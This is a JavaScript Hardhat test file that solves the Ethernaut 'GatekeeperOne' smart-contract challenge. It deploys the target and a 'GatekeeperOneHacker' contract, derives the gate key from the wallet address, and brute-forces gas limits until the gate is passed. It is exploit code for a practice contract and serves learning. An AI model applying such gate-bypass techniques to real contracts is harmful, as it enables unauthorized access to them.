/* eslint-disable no-undef */
// Right click on the script name and hit "Run" to execute
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GatekeeperOneHacker", function () {
  let deployedGatekeeperOne;
  let deployedGatekeeperOneHacker
  it("test initial value", async function () {
    const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
    deployedGatekeeperOne = await GatekeeperOne.deploy();
    await deployedGatekeeperOne.deployed();
    console.log("gatekeeperOne deployed at:" + deployedGatekeeperOne.address);
    const result = await deployedGatekeeperOne.entrant();
    expect(result).to.equal('0x0000000000000000000000000000000000000000');
  });
  it('deploys gatekeeper hacker', async () => {
    const GatekeeperOneHacker = await ethers.getContractFactory("GatekeeperOneHacker");
    deployedGatekeeperOneHacker = await GatekeeperOneHacker.deploy(deployedGatekeeperOne.address);
    await deployedGatekeeperOneHacker.deployed();
    console.log("gatekeeperOne deployed at:" + deployedGatekeeperOneHacker.address);
    expect(await deployedGatekeeperOneHacker.gasCostOfGateOne()).to.equal(140);
    const result = await deployedGatekeeperOneHacker.gatekeeper();
    expect(deployedGatekeeperOne.address).to.equal(result);
  })
  it.skip('Gate 3 = checks key', async () => {
    const [wallet] = await ethers.getSigners();
    const computedKey = await deployedGatekeeperOneHacker.getDerivedKey(wallet.address);
    const result = await deployedGatekeeperOneHacker.checkKey(computedKey, wallet.address);
    expect(result[0]).to.equal(true);
    expect(result[1]).to.equal(true);
    expect(result[2]).to.equal(true);
  })
  it("Gate 2 and 3", async () => {
    const [wallet] = await ethers.getSigners();
    // --- Brute-force parameters ---
    const base = 8191;
    const offset = 149; // adjust if needed
    const startN = 10;
    const endN = 50;
    const key =  await deployedGatekeeperOneHacker.getDerivedKey(wallet.address); // bytes8 key
    let successfulGasLimit

    for (let n = startN; n <= endN; n++) {
        const gasLimit = n * base + offset;

        try {
            const tx = await deployedGatekeeperOne.connect(wallet).enter(key, { gasLimit });
            const receipt = await tx.wait();
            successfulGasLimit = gasLimit
            console.log(`✅ Success! Gas: ${gasLimit}`);
            console.log("Transaction hash:", receipt.hash);
            break; // stop at first success
        } catch (err) {
            if (err.data) {
                console.log(`❌ Attempt n=${n} failed (gas=${gasLimit}) - revert data:`, err.data);
            } else {
                console.log(`❌ Attempt n=${n} failed (gas=${gasLimit})`);
            }
        }
    }
    expect(successfulGasLimit > 1).to.equal(true);
    console.log({successfulGasLimit})
  })
});